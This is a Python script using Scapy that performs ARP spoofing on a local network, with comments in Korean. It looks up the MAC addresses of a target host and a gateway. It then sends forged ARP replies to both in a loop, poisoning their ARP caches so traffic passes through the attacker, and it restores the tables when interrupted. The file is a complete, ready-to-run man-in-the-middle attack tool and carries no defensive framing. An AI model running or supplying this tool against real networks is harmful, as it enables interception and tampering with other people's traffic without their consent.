from scapy.all import *
from scapy.layers.l2 import ARP,Ether
from time import sleep
import argparse

#insta : chxn_.minn
#github : github.com/lydhwa

def isGetMac(ip):
    try:
        req = ARP(pdst=ip) #arp 요청 패킷 설정
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") # 이더넷 프레임 생성
        result = broadcast / req # 이더넷프레임 + arp 패킷 
        ans = srp(result,verbose=False)[0] # 네트워크에 전송 후 응답받기
        mac = ans[0][1].hwsrc #맥주소만 추출
        return mac
    except Exception as e:
        print(f"[!] Error : {e}")
        return False
    
def isSendARP(ip,tgip,tgmac): #arp 보내기
    arp = ARP(
        op=2,
        psrc=ip, # 게이트웨이 아이피
        pdst=tgip, # 대상 아이피
        hwdst=tgmac # 대상 mac주소
    )
    send(arp,verbose=0) #arp 보내기

def isrestoreARP(tgip, tgmac, gtip, gtmac): #스푸핑 끝내고 원상태로 복구
    send(ARP(op=2, pdst=tgip, hwdst=tgmac, psrc=gtip, hwsrc=gtmac), count=5, verbose=0)
    send(ARP(op=2, pdst=gtip, hwdst=gtmac, psrc=tgip, hwsrc=tgmac), count=5, verbose=0)

 
def main():
    parser = argparse.ArgumentParser(description="simple arp spoofing\nex : python arp.py -sf <spoofingip> -tgip <targetip>")
    parser.add_argument('-sf', required=True, help='spoofing ip')
    parser.add_argument('-tgip', required=True, help='target ip')
    
    args = parser.parse_args()

    target_ip = args.tgip
    spoof_ip = args.sf


    
    targetMac = isGetMac(target_ip)
    gatewayMac = isGetMac(spoof_ip)
    
    if targetMac == False or gatewayMac == False:
        return input("[-] Error : please check network")

    print(f"ARP SPOOFING START")

    try:
        while True:
            isSendARP(spoof_ip,target_ip,targetMac)
            isSendARP(target_ip, spoof_ip, gatewayMac)
            sleep(1)
    except KeyboardInterrupt as e:
        isrestoreARP(target_ip, targetMac, spoof_ip, gatewayMac)
        print("ARP tabel restored")
        return input(f"[-] Error : {e}")
    
    
if __name__ == "__main__":
    main()
